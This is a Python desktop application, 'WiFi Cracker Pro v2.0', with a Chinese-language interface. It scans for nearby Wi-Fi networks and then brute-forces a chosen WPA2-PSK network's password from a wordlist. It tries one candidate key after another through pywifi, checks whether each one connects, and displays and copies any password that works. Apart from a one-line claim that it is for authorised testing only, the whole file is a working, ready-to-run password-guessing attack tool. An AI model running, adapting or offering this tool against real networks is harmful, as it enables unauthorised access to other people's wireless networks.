import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import pywifi
from pywifi import const
import time
import os
import platform
import subprocess
import threading
from datetime import datetime

# ─────────────────────────────────────────
#  颜色主题
# ─────────────────────────────────────────
COLORS = {
    "bg":        "#1a1a2e",
    "panel":     "#16213e",
    "card":      "#0f3460",
    "accent":    "#e94560",
    "accent2":   "#533483",
    "success":   "#00b894",
    "warning":   "#fdcb6e",
    "error":     "#d63031",
    "text":      "#dfe6e9",
    "text_dim":  "#636e72",
    "entry_bg":  "#2d3436",
    "entry_fg":  "#dfe6e9",
    "log_bg":    "#0d0d1a",
    "log_fg":    "#00cec9",
}


class WiFiCrackerGUI:

    def __init__(self, root_window):
        self.root_window = root_window
        self.password_file_path = tk.StringVar()
        self.target_wifi_name = tk.StringVar()
        self.cracked_password = tk.StringVar()
        self.is_cracking = False
        self.stop_event = threading.Event()
        self.total_attempts = 0
        self.crack_thread = None

        self._apply_theme()
        self._setup_window()
        self._update_status("正在初始化...", "info")
        self.wifi_interface = None
        # 在子线程中初始化，避免启动卡顿
        threading.Thread(target=self._initialize_wifi_interface, daemon=True).start()

    # ─────────────────────────────────────
    #  主题 & 样式
    # ─────────────────────────────────────
    def _apply_theme(self):
        style = ttk.Style()
        style.theme_use("clam")

        C = COLORS
        style.configure(".",
            background=C["bg"], foreground=C["text"],
            fieldbackground=C["entry_bg"], font=("Microsoft YaHei", 10))

        style.configure("TFrame",    background=C["bg"])
        style.configure("Card.TFrame", background=C["panel"],
                        relief="flat")

        style.configure("TLabel",    background=C["bg"],  foreground=C["text"])
        style.configure("Dim.TLabel",background=C["bg"],  foreground=C["text_dim"],
                        font=("Microsoft YaHei", 9))
        style.configure("Title.TLabel", background=C["bg"], foreground=C["accent"],
                        font=("Microsoft YaHei", 18, "bold"))
        style.configure("Sub.TLabel",   background=C["bg"], foreground=C["text_dim"],
                        font=("Microsoft YaHei", 9))

        style.configure("TLabelframe", background=C["panel"],
                        foreground=C["accent"], font=("Microsoft YaHei", 10, "bold"),
                        relief="flat", borderwidth=1)
        style.configure("TLabelframe.Label", background=C["panel"],
                        foreground=C["accent"])

        style.configure("TNotebook",        background=C["bg"],  tabmargins=[2,5,2,0])
        style.configure("TNotebook.Tab",    background=C["card"], foreground=C["text_dim"],
                        padding=[14,6], font=("Microsoft YaHei", 10))
        style.map("TNotebook.Tab",
            background=[("selected", C["accent"])],
            foreground=[("selected", "#ffffff")])

        style.configure("TEntry",  fieldbackground=C["entry_bg"],
                        foreground=C["entry_fg"], insertcolor=C["text"],
                        relief="flat", padding=6)

        # 按钮
        for name, bg, fg, abg in [
            ("Primary.TButton",   C["accent"],  "#fff", "#c0392b"),
            ("Secondary.TButton", C["card"],    C["text"], C["accent2"]),
            ("Danger.TButton",    C["error"],   "#fff", "#b71c1c"),
            ("Success.TButton",   C["success"], "#fff", "#00a381"),
        ]:
            style.configure(name, background=bg, foreground=fg,
                            font=("Microsoft YaHei", 10, "bold"),
                            relief="flat", padding=[12, 7], borderwidth=0)
            style.map(name, background=[("active", abg)],
                      relief=[("pressed", "flat")])

        style.configure("TProgressbar",
                        troughcolor=C["entry_bg"], background=C["accent"],
                        thickness=6)
        style.configure("TScrollbar",
                        background=C["card"], troughcolor=C["bg"],
                        arrowcolor=C["text_dim"])
        style.configure("TSeparator", background=C["card"])

    # ─────────────────────────────────────
    #  窗口布局
    # ─────────────────────────────────────
    def _setup_window(self):
        C = COLORS
        self.root_window.title("WiFi Cracker Pro v2.0")
        W, H = 760, 640
        self.root_window.geometry(f"{W}x{H}")
        self.root_window.resizable(False, False)
        self.root_window.configure(bg=C["bg"])

        sw = self.root_window.winfo_screenwidth()
        sh = self.root_window.winfo_screenheight()
        self.root_window.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")

        # ── 顶部标题栏 ──
        header = tk.Frame(self.root_window, bg=C["panel"], height=70)
        header.pack(fill="x")
        header.pack_propagate(False)

        tk.Label(header, text="🛡  WiFi Cracker Pro",
                 bg=C["panel"], fg=C["accent"],
                 font=("Microsoft YaHei", 18, "bold")).pack(side="left", padx=20, pady=10)
        tk.Label(header, text="仅供合法安全测试使用  |  v2.0",
                 bg=C["panel"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack(side="right", padx=20)

        # ── 主体 ──
        main_frame = tk.Frame(self.root_window, bg=C["bg"])
        main_frame.pack(fill="both", expand=True, padx=16, pady=10)

        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill="both", expand=True)

        # ── Tab 1: 破解 ──
        tab1 = tk.Frame(notebook, bg=C["bg"])
        notebook.add(tab1, text="  🔓 破解  ")
        self._build_crack_tab(tab1)

        # ── Tab 2: 日志 ──
        tab2 = tk.Frame(notebook, bg=C["bg"])
        notebook.add(tab2, text="  📋 日志  ")
        self._build_log_tab(tab2)

        # ── Tab 3: 关于 ──
        tab3 = tk.Frame(notebook, bg=C["bg"])
        notebook.add(tab3, text="  ℹ 关于  ")
        self._build_about_tab(tab3)

        # ── 底部状态栏 ──
        status_bar = tk.Frame(self.root_window, bg=C["panel"], height=32)
        status_bar.pack(fill="x", side="bottom")
        status_bar.pack_propagate(False)

        self.status_label = tk.Label(
            status_bar, text="就绪", anchor="w",
            bg=C["panel"], fg=C["text_dim"],
            font=("Microsoft YaHei", 9), padx=12)
        self.status_label.pack(side="left", fill="x", expand=True)

        self.progress = ttk.Progressbar(
            status_bar, mode="determinate", length=180)
        self.progress.pack(side="right", padx=12, pady=6)

        # 快捷键
        self.root_window.bind("<Control-o>", lambda e: self._select_password_file())
        self.root_window.bind("<Control-s>", lambda e: self._scan_available_wifi())
        self.root_window.bind("<F5>",        lambda e: self._start_cracking())
        self.root_window.bind("<Control-q>", lambda e: self.root_window.quit())

    def _card(self, parent, title, pady=(8, 8)):
        """带标题的卡片容器"""
        outer = tk.Frame(parent, bg=COLORS["bg"])
        outer.pack(fill="x", pady=pady, padx=4)
        tk.Label(outer, text=title, bg=COLORS["bg"],
                 fg=COLORS["accent"], font=("Microsoft YaHei", 10, "bold")
                 ).pack(anchor="w", pady=(0, 4))
        inner = tk.Frame(outer, bg=COLORS["panel"], padx=12, pady=10)
        inner.pack(fill="x")
        return inner

    def _build_crack_tab(self, parent):
        C = COLORS
        pad = tk.Frame(parent, bg=C["bg"])
        pad.pack(fill="both", expand=True, padx=12, pady=10)

        # WiFi 名称
        card1 = self._card(pad, "🎯  目标网络")
        tk.Label(card1, text="WiFi 名称 (SSID):",
                 bg=C["panel"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack(anchor="w")
        row1 = tk.Frame(card1, bg=C["panel"])
        row1.pack(fill="x", pady=(4, 0))
        self.wifi_entry = ttk.Entry(row1, textvariable=self.target_wifi_name)
        self.wifi_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        ttk.Button(row1, text="扫描 WiFi",
                   command=self._scan_available_wifi,
                   style="Secondary.TButton").pack(side="right")

        # 字典文件
        card2 = self._card(pad, "📂  密码字典")
        tk.Label(card2, text="字典文件路径:",
                 bg=C["panel"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack(anchor="w")
        row2 = tk.Frame(card2, bg=C["panel"])
        row2.pack(fill="x", pady=(4, 0))
        self.path_entry = ttk.Entry(row2, textvariable=self.password_file_path)
        self.path_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        ttk.Button(row2, text="浏览…",
                   command=self._select_password_file,
                   style="Secondary.TButton").pack(side="right")

        # 统计信息行
        stats_row = tk.Frame(pad, bg=C["bg"])
        stats_row.pack(fill="x", pady=(6, 0), padx=4)
        self.lbl_tried   = tk.Label(stats_row, text="已尝试: 0",
                                    bg=C["bg"], fg=C["text_dim"],
                                    font=("Microsoft YaHei", 9))
        self.lbl_tried.pack(side="left", padx=(0, 20))
        self.lbl_total   = tk.Label(stats_row, text="总计: 0",
                                    bg=C["bg"], fg=C["text_dim"],
                                    font=("Microsoft YaHei", 9))
        self.lbl_total.pack(side="left", padx=(0, 20))
        self.lbl_speed   = tk.Label(stats_row, text="速度: 0 次/s",
                                    bg=C["bg"], fg=C["text_dim"],
                                    font=("Microsoft YaHei", 9))
        self.lbl_speed.pack(side="left")
        self.lbl_eta     = tk.Label(stats_row, text="预计剩余: --",
                                    bg=C["bg"], fg=C["text_dim"],
                                    font=("Microsoft YaHei", 9))
        self.lbl_eta.pack(side="right")

        # 当前尝试密码
        cur_row = tk.Frame(pad, bg=C["bg"])
        cur_row.pack(fill="x", pady=(4, 0), padx=4)
        tk.Label(cur_row, text="当前密码:",
                 bg=C["bg"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack(side="left", padx=(0, 6))
        self.lbl_current = tk.Label(cur_row, text="—",
                                    bg=C["bg"], fg=C["warning"],
                                    font=("Courier New", 9))
        self.lbl_current.pack(side="left")

        # 按钮
        btn_row = tk.Frame(pad, bg=C["bg"])
        btn_row.pack(pady=16)
        self.crack_button = ttk.Button(
            btn_row, text="🚀  开始破解",
            command=self._start_cracking,
            style="Primary.TButton", width=22)
        self.crack_button.pack()

        # 结果
        card3 = self._card(pad, "🔑  破解结果", pady=(4, 0))
        res_row = tk.Frame(card3, bg=C["panel"])
        res_row.pack(fill="x")
        tk.Label(res_row, text="找到的密码:",
                 bg=C["panel"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack(side="left", padx=(0, 8))
        self.result_entry = ttk.Entry(
            res_row, textvariable=self.cracked_password,
            font=("Courier New", 11), state="readonly")
        self.result_entry.pack(side="left", fill="x", expand=True)
        ttk.Button(res_row, text="复制",
                   command=self._copy_password,
                   style="Success.TButton").pack(side="right", padx=(8, 0))

    def _build_log_tab(self, parent):
        C = COLORS
        pad = tk.Frame(parent, bg=C["bg"])
        pad.pack(fill="both", expand=True, padx=12, pady=10)

        # 工具栏
        toolbar = tk.Frame(pad, bg=C["bg"])
        toolbar.pack(fill="x", pady=(0, 6))
        ttk.Button(toolbar, text="清空日志",
                   command=self._clear_logs,
                   style="Secondary.TButton").pack(side="left", padx=(0, 6))
        ttk.Button(toolbar, text="保存日志",
                   command=self._save_logs,
                   style="Secondary.TButton").pack(side="left")

        # 日志框
        log_frame = tk.Frame(pad, bg=C["log_bg"], bd=1, relief="flat")
        log_frame.pack(fill="both", expand=True)

        scrollbar = ttk.Scrollbar(log_frame)
        scrollbar.pack(side="right", fill="y")

        self.log_text = tk.Text(
            log_frame, yscrollcommand=scrollbar.set,
            font=("Courier New", 9),
            bg=C["log_bg"], fg=C["log_fg"],
            insertbackground=C["text"],
            selectbackground=C["card"],
            relief="flat", wrap="word", padx=8, pady=6)
        self.log_text.pack(side="left", fill="both", expand=True)
        scrollbar.config(command=self.log_text.yview)

        # 颜色标签
        self.log_text.tag_config("info",    foreground=C["log_fg"])
        self.log_text.tag_config("success", foreground=C["success"])
        self.log_text.tag_config("warning", foreground=C["warning"])
        self.log_text.tag_config("error",   foreground=C["error"])

    def _build_about_tab(self, parent):
        C = COLORS
        pad = tk.Frame(parent, bg=C["bg"])
        pad.pack(fill="both", expand=True, padx=30, pady=20)

        tk.Label(pad, text="🛡  WiFi Cracker Pro",
                 bg=C["bg"], fg=C["accent"],
                 font=("Microsoft YaHei", 16, "bold")).pack(pady=(0, 4))
        tk.Label(pad, text="Version 2.0  ·  2026",
                 bg=C["bg"], fg=C["text_dim"],
                 font=("Microsoft YaHei", 9)).pack()

        tk.Frame(pad, bg=C["card"], height=1).pack(fill="x", pady=14)

        info = [
            ("功能", "扫描 WiFi / 字典破解 WPA/WPA2 / 实时进度统计"),
            ("优化", "多线程破解，界面不卡顿；确定进度条；速度/ETA 显示"),
            ("快捷键", "Ctrl+O 选文件  |  Ctrl+S 扫描  |  F5 开始  |  Ctrl+Q 退出"),
            ("开发者", "相机管家"),
            ("声明", "本工具仅用于合法授权的安全测试，请勿用于非法用途"),
        ]
        for k, v in info:
            row = tk.Frame(pad, bg=C["bg"])
            row.pack(fill="x", pady=5)
            tk.Label(row, text=f"{k}：", width=8, anchor="e",
                     bg=C["bg"], fg=C["accent"],
                     font=("Microsoft YaHei", 10, "bold")).pack(side="left")
            tk.Label(row, text=v, anchor="w",
                     bg=C["bg"], fg=C["text"],
                     font=("Microsoft YaHei", 10),
                     wraplength=500, justify="left").pack(side="left")

    # ─────────────────────────────────────
    #  WiFi 初始化
    # ─────────────────────────────────────
    def _initialize_wifi_interface(self):
        try:
            system_os = platform.system()
            self._safe_status(f"系统检测: {system_os}", "info")

            if system_os == "Windows":
                result = subprocess.run(
                    ["sc", "query", "Wlansvc"],
                    capture_output=True, text=True)
                if "RUNNING" not in result.stdout:
                    self._safe_status("警告: WLAN 服务未运行", "warning")

            wifi = pywifi.PyWiFi()
            interfaces = wifi.interfaces()

            if interfaces:
                self._safe_status(f"✓ 找到 {len(interfaces)} 个无线接口", "success")
                for i, iface in enumerate(interfaces):
                    self._safe_log(f"接口 {i}: {iface.name()}")
                self.wifi_interface = interfaces[0]
                self.wifi_interface.disconnect()
                time.sleep(1)
                st = self.wifi_interface.status()
                if st in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                    self._safe_status("✓ WiFi 接口初始化完成", "success")
                else:
                    self._safe_status("警告: 网卡可能未完全断开", "warning")
            else:
                self._safe_status("✗ 没有可用的无线网卡", "error")
                self.root_window.after(0, lambda: messagebox.showwarning(
                    "硬件检测", "未检测到可用的 WiFi 网卡"))
        except Exception as e:
            self._safe_status(f"✗ 初始化失败: {str(e)[:60]}", "error")
            self.root_window.after(0, lambda: messagebox.showerror(
                "初始化失败", f"初始化 WiFi 接口时出错:\n{e}"))

    # ─────────────────────────────────────
    #  线程安全辅助
    # ─────────────────────────────────────
    def _safe_status(self, msg, level="info"):
        self.root_window.after(0, lambda: self._update_status(msg, level))

    def _safe_log(self, msg, level="info"):
        self.root_window.after(0, lambda: self._add_log(msg, level))

    def _add_log(self, message, level="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert("end", f"[{ts}] {message}\n", level)
        self.log_text.see("end")

    def _update_status(self, message, level="info"):
        colors = {
            "info":    COLORS["text_dim"],
            "success": COLORS["success"],
            "warning": COLORS["warning"],
            "error":   COLORS["error"],
        }
        self.status_label.config(text=message, fg=colors.get(level, COLORS["text_dim"]))
        self._add_log(message, level)

    # ─────────────────────────────────────
    #  文件 & 扫描
    # ─────────────────────────────────────
    def _select_password_file(self):
        fp = filedialog.askopenfilename(
            title="选择密码字典文件",
            filetypes=[("文本文件", "*.txt"), ("字典文件", "*.dic"), ("所有文件", "*.*")],
            initialdir=os.path.expanduser("~"))
        if fp:
            self.password_file_path.set(fp)
            size = os.path.getsize(fp) / 1024
            self._update_status(
                f"✓ 已选择: {os.path.basename(fp)} ({size:.1f} KB)", "success")

    def _scan_available_wifi(self):
        if not self._check_wifi_interface():
            return
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        try:
            self._safe_status("正在扫描 WiFi 网络...", "info")
            self.root_window.after(0, lambda: self.progress.config(
                mode="indeterminate", value=0))
            self.root_window.after(0, self.progress.start)

            self.wifi_interface.scan()
            time.sleep(5)
            results = self.wifi_interface.scan_results()

            self.root_window.after(0, self.progress.stop)
            self.root_window.after(0, lambda: self.progress.config(
                mode="determinate", value=0))

            if not results:
                self._safe_status("扫描完成: 未发现网络", "warning")
                self.root_window.after(0, lambda: messagebox.showinfo(
                    "扫描结果", "未发现任何 WiFi 网络"))
                return

            unique = {}
            for r in results:
                if r.ssid and (r.ssid not in unique or
                               r.signal > unique[r.ssid]["signal"]):
                    unique[r.ssid] = {"ssid": r.ssid, "signal": r.signal}

            sorted_w = sorted(unique.values(),
                              key=lambda x: x["signal"], reverse=True)[:20]
            txt = f"发现 {len(unique)} 个 WiFi 网络:\n\n"
            txt += f"{'信号':<8} {'网络名称'}\n" + "─" * 36 + "\n"
            for w in sorted_w:
                bars = "█" * min(5, (w["signal"] + 100) // 20)
                txt += f"{bars:<8} {w['ssid'][:28]}\n"

            self._safe_status(f"✓ 扫描完成: 发现 {len(unique)} 个网络", "success")
            self.root_window.after(0, lambda: messagebox.showinfo(
                "可用 WiFi 网络", txt))
        except Exception as e:
            self.root_window.after(0, self.progress.stop)
            self._safe_status(f"✗ 扫描失败: {str(e)[:60]}", "error")

    # ─────────────────────────────────────
    #  破解（子线程，UI 不卡）
    # ─────────────────────────────────────
    def _start_cracking(self):
        if self.is_cracking:
            # 停止
            self.stop_event.set()
            self.is_cracking = False
            self.crack_button.config(text="🚀  开始破解", style="Primary.TButton")
            self._update_status("正在停止破解...", "warning")
        else:
            self._crack_wifi_password()

    def _crack_wifi_password(self):
        if not self._check_wifi_interface():
            return

        target_ssid  = self.target_wifi_name.get().strip()
        password_file = self.password_file_path.get().strip()

        if not target_ssid:
            messagebox.showwarning("输入错误", "请输入目标 WiFi 名称")
            return
        if not password_file or not os.path.exists(password_file):
            messagebox.showwarning("输入错误", "请选择有效的密码字典文件")
            return

        try:
            with open(password_file, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f if l.strip()]
            if not passwords:
                messagebox.showwarning("文件错误", "密码字典文件为空")
                return
            self.total_attempts = len(passwords)
            self._add_log(f"加载了 {self.total_attempts} 个密码")
        except Exception as e:
            messagebox.showerror("文件错误", f"读取密码文件失败:\n{e}")
            return

        if not messagebox.askyesno("确认",
                f"确定要开始破解 「{target_ssid}」 吗？\n将尝试 {self.total_attempts} 个密码"):
            return

        self.stop_event.clear()
        self.is_cracking = True
        self.cracked_password.set("")
        self.crack_button.config(text="⏹  停止破解", style="Danger.TButton")
        self.progress.config(mode="determinate", maximum=self.total_attempts, value=0)
        self.lbl_total.config(text=f"总计: {self.total_attempts}")
        self.lbl_tried.config(text="已尝试: 0")
        self.lbl_speed.config(text="速度: 0 次/s")
        self.lbl_eta.config(text="预计剩余: --")

        self.crack_thread = threading.Thread(
            target=self._crack_worker,
            args=(target_ssid, passwords),
            daemon=True)
        self.crack_thread.start()

    def _crack_worker(self, target_ssid, passwords):
        profile = pywifi.Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        start_time = time.time()
        passwords_tried = 0
        speed_window = []

        self._safe_status(f"🔓 正在尝试破解 {target_ssid}...", "info")

        for index, password in enumerate(passwords, 1):
            if self.stop_event.is_set():
                break

            try:
                profile.key = password
                passwords_tried += 1
                t_now = time.time()
                speed_window.append(t_now)
                # 保留最近 30 条记录计算速度
                if len(speed_window) > 30:
                    speed_window.pop(0)

                # 每次都更新 UI（通过 after 调度，不阻塞）
                idx_snap = index
                pw_snap  = password
                tried_snap = passwords_tried
                total_snap = self.total_attempts

                elapsed = t_now - start_time
                speed = tried_snap / elapsed if elapsed > 0 else 0
                remaining = (total_snap - tried_snap) / speed if speed > 0 else 0
                eta_str = self._fmt_time(remaining) if speed > 0 else "--"

                self.root_window.after(0, lambda i=idx_snap, p=pw_snap,
                                       tr=tried_snap, sp=speed, et=eta_str: (
                    self.progress.config(value=i),
                    self.lbl_tried.config(text=f"已尝试: {tr}"),
                    self.lbl_current.config(text=p),
                    self.lbl_speed.config(text=f"速度: {sp:.1f} 次/s"),
                    self.lbl_eta.config(text=f"预计剩余: {et}"),
                    self.status_label.config(
                        text=f"尝试中 {tr}/{total_snap}  ({tr/total_snap*100:.1f}%)")
                ))

                self.wifi_interface.remove_all_network_profiles()
                tmp_profile = self.wifi_interface.add_network_profile(profile)
                self.wifi_interface.connect(tmp_profile)

                # 等待连接（每 0.5s 检查一次，共 4s）
                connected = False
                for _ in range(8):
                    if self.stop_event.is_set():
                        break
                    time.sleep(0.5)
                    if self.wifi_interface.status() == const.IFACE_CONNECTED:
                        connected = True
                        break

                if connected:
                    elapsed_total = time.time() - start_time
                    self.root_window.after(0, lambda p=password, idx=index,
                                           et=elapsed_total: self._on_crack_success(
                        target_ssid, p, idx, et))
                    return

                self.wifi_interface.disconnect()
                time.sleep(0.2)

            except Exception as e:
                self._safe_log(f"尝试 [{password}] 出错: {str(e)[:60]}", "warning")
                continue

        # 循环结束
        elapsed_total = time.time() - start_time
        self.root_window.after(0, lambda pt=passwords_tried,
                               et=elapsed_total: self._on_crack_done(
            target_ssid, pt, et))

    def _on_crack_success(self, ssid, password, index, elapsed):
        self.cracked_password.set(password)
        self.is_cracking = False
        self.crack_button.config(text="🚀  开始破解", style="Primary.TButton")
        self.progress.config(value=self.total_attempts)
        self.lbl_current.config(text=password, fg=COLORS["success"])
        self._update_status(
            f"✅ 破解成功！密码: {password}  用时: {elapsed:.1f}s  尝试: {index} 次",
            "success")
        messagebox.showinfo(
            "🎉 破解成功",
            f"WiFi 名称：{ssid}\n"
            f"密　　码：{password}\n"
            f"用　　时：{elapsed:.1f} 秒\n"
            f"尝试次数：{index}")

    def _on_crack_done(self, ssid, tried, elapsed):
        self.is_cracking = False
        self.crack_button.config(text="🚀  开始破解", style="Primary.TButton")
        if self.stop_event.is_set():
            self._update_status(f"⏹ 已停止，尝试了 {tried} 个密码", "warning")
            messagebox.showinfo("已停止", f"破解已停止\n已尝试 {tried} 个密码")
        else:
            self._update_status(
                f"❌ 破解失败，已尝试 {self.total_attempts} 个密码  用时: {elapsed:.1f}s",
                "error")
            messagebox.showinfo(
                "破解失败",
                f"未能破解 「{ssid}」\n"
                f"已尝试 {self.total_attempts} 个密码\n"
                f"用时：{elapsed:.1f} 秒")

    # ─────────────────────────────────────
    #  工具方法
    # ─────────────────────────────────────
    @staticmethod
    def _fmt_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds//60)}m {int(seconds%60)}s"
        else:
            return f"{int(seconds//3600)}h {int((seconds%3600)//60)}m"

    def _copy_password(self):
        pw = self.cracked_password.get()
        if pw:
            self.root_window.clipboard_clear()
            self.root_window.clipboard_append(pw)
            self._update_status("✓ 密码已复制到剪贴板", "success")
        else:
            messagebox.showinfo("提示", "尚未破解出密码")

    def _check_wifi_interface(self):
        if not self.wifi_interface:
            messagebox.showerror(
                "硬件错误",
                "未检测到可用的 WiFi 网卡\n"
                "请确保：\n1. 已插入无线网卡\n2. 无线网卡已启用\n3. 拥有管理员权限")
            return False
        return True

    def _clear_logs(self):
        self.log_text.delete("1.0", "end")
        self._update_status("日志已清空", "info")

    def _save_logs(self):
        fp = filedialog.asksaveasfilename(
            title="保存日志文件",
            defaultextension=".txt",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")])
        if fp:
            try:
                with open(fp, "w", encoding="utf-8") as f:
                    f.write(self.log_text.get("1.0", "end"))
                self._update_status(
                    f"✓ 日志已保存: {os.path.basename(fp)}", "success")
            except Exception as e:
                messagebox.showerror("保存失败", f"保存日志时出错:\n{e}")


# ─────────────────────────────────────────
#  入口
# ─────────────────────────────────────────
def main():
    root = tk.Tk()
    try:
        root.iconbitmap("wifi_icon.ico")
    except Exception:
        pass

    app = WiFiCrackerGUI(root)

    def on_closing():
        if app.is_cracking:
            if messagebox.askokcancel("退出", "正在破解中，确定要退出吗？"):
                app.stop_event.set()
                app.is_cracking = False
                root.destroy()
        else:
            root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()


if __name__ == "__main__":
    main()